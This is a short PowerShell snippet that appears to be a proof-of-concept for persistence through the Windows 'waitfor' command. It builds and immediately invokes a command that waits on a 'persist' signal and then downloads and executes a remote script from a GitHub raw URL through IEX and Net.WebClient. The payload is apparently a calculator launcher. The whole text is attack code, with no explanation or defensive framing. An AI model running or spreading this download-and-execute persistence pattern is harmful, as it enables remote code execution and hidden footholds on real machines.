# start-process calc.exe
1
$example_code ="cmd /c waitfor persist `&`& powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/test/master/calc3.ps1')"
invoke-expression $example_code
